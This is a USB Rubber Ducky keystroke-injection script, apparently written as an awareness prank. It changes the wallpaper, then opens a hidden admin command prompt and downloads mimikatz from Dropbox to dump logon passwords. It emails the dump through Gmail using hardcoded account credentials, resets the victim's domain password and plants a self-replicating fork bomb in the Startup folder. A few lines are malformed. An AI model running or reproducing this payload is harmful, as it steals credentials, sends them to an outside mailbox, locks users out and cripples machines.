REM ------------------------
REM Change background to image that says 'return usb to cyber security dep. building a'
REM This is a script to download and change the wallpaper in windows 10
REM In order to work, windows must be using the default app for opening photos 
DELAY 5000
CONTROL ESCAPE
DELAY 100
REM Note: The internet explorer method works usually for everyone but
REM If you want to use Chrome or Firefox instead of IE, remove 'iexplorer' from the following line
REM but also make sure to follow instructions bellow
STRING chrome https://dl.dropboxusercontent.com/s/46r8t3df7x4dajh/wallpaper.png/dl=0
ENTER
DELAY 4000
CONTROL s
DELAY 2000
ENTER
DELAY 300
REM Author: Pesce
REM Date: 10/20/2013
REM Note: Thanks to all the help everyone! This is my first attempt, don't be to upset!
REM -------------open command prompt with admin privileges and hide it
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
ENTER
DELAY 300
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER
STRING cd /
ENTER
DELAY 300
STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Downloads\Wallpaper.png /f
DELAY 500
ENTER
DELAY 500
STRING RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
DELAY 500
ENTER
DELAY 500
REM -------------download appropriate mimikatz for architecture
STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/89al9mz3r7bnz5b/mimikatz32.exe?dl=0','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/y7knhngbdpd7s6u/mimikatz64.exe?dl=0','%TEMP%\pw.exe');}
ENTER
DELAY 5000
REM -------------get the passwords and save to c:\pwlog.txt
STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
ENTER
DELAY 2000
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 300
STRING del %TEMP%\pw.exe
ENTER
DELAY 300
REM -------------email log via gmail
STRING powershell
ENTER
DELAY 300
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('rubberduckreport', 'b7tDB4~;');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'rubberduckreport@gmail.com'
ENTER
STRING $ReportEmail.To.Add('rubberduckreport@gmail.com')
ENTER
STRING $ReportEmail.To.Add('kylancoffey63@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Duck Report'
ENTER
STRING $ReportEmail.Body = 'Attached is your duck report.' 
ENTER
STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 300
REM ---------------------change user's password
STRING net user %username% iwillneverpluginarandomusbintomycomputeragain /domain
ENTER
DELAY 300
REM ---------------------use parse_Invoke-Mimikatz by Russel Van Tuyl to find current users' password
STRING echo Thanks for giving away your password: > C:\desktop\WRECKED.txt
ENTER
DELAY 300
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/h8dhbeaxqgru19c/parse_Invoke-Mimikatz.exe?dl=0', '%TEMP%\parseMK.exe')
ENTER
DELAY 5000
STRING %TEMP%\parseMK.exe --file c:\pwlog.txt >> C:\desktop\README.txt
DELAY 300
STRING del %TEMP%\parseMK.exe
ENTER
DELAY 300
STRING echo. >> C:\desktop\README.txt
ENTER
DELAY 300
STRING echo Your new password is now: iwillneverpluginarandomusbintomycomputeragain >> C:\desktop\WRECKED.txt
ENTER
DELAY 300
STRING echo. >> C:\desktop\README.txt
ENTER
DELAY 300
STRING echo Please return the USB drive to the Cyber Security Department, building A >> C:\desktop\WRECKED.txt
ENTER
DELAY 300
start notepad "C:\desktop\WRECKED.txt"
ENTER
DELAY 1000
REM ---------------------delete pwlog.txt
STRING del c:\pwlog.txt
ENTER
DELAY 300
STRING exit
ENTER
REM --------------------start fork bomb
MENU
DELAY 100
STRING a
ENTER
DELAY 200
LEFTARROW
ENTER
DELAY 1000
STRING cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
ENTER
STRING copy con a.bat
ENTER
STRING @echo off
ENTER
STRING :START
ENTER
STRING start a.bat 
ENTER
STRING GOTO START
ENTER
CONTROL z
ENTER
STRING a.bat
ENTER
ALT F4